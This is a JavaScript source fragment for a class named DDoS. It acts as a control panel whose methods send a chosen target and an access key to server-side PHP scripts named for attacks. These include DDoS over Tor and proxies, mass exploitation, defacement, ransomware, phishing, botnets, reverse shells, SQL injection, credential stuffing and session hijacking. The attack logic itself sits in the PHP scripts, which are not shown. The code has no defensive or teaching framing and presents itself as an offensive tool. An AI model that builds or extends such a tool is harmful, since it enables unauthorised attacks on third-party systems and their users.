class DDoS {
 ...
 async exploit(target) {
  ...
  try {
   const response = await fetch(`exploit.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'GET'
   });
   const data = await response.json();
 ...
 async massExploit() {
  ...
  try {
   const response = await fetch(`mass_exploit.php?Key=${this.Key}`, {
    method: 'GET'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async deface(target) {
  ...
  try {
   const response = await fetch(`deface.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async connect(target) {
  ...
  try {
   const response = await fetch(`connect.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'GET'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async bruteForce(target) {
  ...
  try {
   const response = await fetch(`brute_force.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async sendDDoSRequest(target) {
  ...
  try {
   ...
   const url = `ddos.php?target=${encodeURIComponent(target)}&Key=${this.Key}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${this.requestRate}`;
 ...
 async ransomware(target) {
  ...
  try {
   const response = await fetch(`ransomware.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async custom(target) {
  ...
  try {
   ...
   const response = await fetch(`custom.php?target=${encodeURIComponent(target)}&code=${encodeURIComponent(customCode)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async phishing(target) {
  ...
  try {
   const response = await fetch(`phishing.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async dataBreach(target) {
  ...
  try {
   const response = await fetch(`data_breach.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async botnet(target) {
  ...
  try {
   const response = await fetch(`botnet.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async zero_day(target) {
  ...
  try {
   const response = await fetch(`zero_day.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async sql_inject(target) {
  ...
  try {
   const response = await fetch(`sql_inject.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async xss(target) {
  ...
  try {
   const response = await fetch(`xss.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async port_scan(target) {
  ...
  try {
   const response = await fetch(`port_scan.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async credential_stuffing(target) {
  ...
  try {
   const response = await fetch(`credential_stuffing.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async network_scan(target) {
  ...
  try {
   const response = await fetch(`network_scan.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async vuln_scan(target) {
  ...
  try {
   const response = await fetch(`vuln_scan.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async reverse_shell(target) {
  ...
  try {
   const response = await fetch(`reverse_shell.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async dns_poisoning(target) {
  ...
  try {
   const response = await fetch(`dns_poisoning.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
 ...
 async session_hijacking(target) {
  ...
  try {
   const response = await fetch(`session_hijacking.php?target=${encodeURIComponent(target)}&Key=${this.Key}`, {
    method: 'POST'
   });
   const data = await response.json();
   this.log(data.message);
